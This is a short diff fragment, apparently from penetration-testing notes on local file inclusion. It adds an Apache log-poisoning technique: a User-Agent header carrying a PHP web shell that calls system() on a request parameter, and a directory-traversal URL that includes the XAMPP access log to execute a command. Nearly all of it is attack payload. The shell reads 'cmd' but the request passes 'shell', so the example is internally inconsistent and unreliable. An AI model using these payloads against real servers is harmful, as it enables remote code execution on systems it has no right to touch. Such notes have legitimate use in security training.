@@ -10,6 +10,10 @@ http://10.11.0.22/menu.php?file=../../../../../../../../../var/log/apache2/acces
 
 Windows log path:
 C:\xampp\apache\logs\
+
+Poison the log:
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+/meteor/index.php?page=..\..\..\..\..\..\..\..\..\xampp\apache\logs\access.log&shell=dir
 ```
 
 ### Null byte to mark the end of file
